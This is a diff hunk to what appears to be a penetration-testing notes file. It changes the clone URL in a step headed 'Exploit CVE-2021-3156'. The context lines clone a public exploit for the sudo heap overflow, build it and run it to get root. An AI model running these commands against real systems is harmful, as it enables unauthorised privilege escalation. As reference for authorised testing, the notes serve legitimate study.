@@ -102,7 +102,7 @@ sudo -V
 Exploit CVE-2021-3156:
 
 ```bash
-git clone https://github.com/blasty/CVE-2021-3156.git
+git clone https://github.com/blasty/CVE-2021-3156
 cd CVE-2021-3156
 make
 ./sudo-hax-me-a-sandwich 1
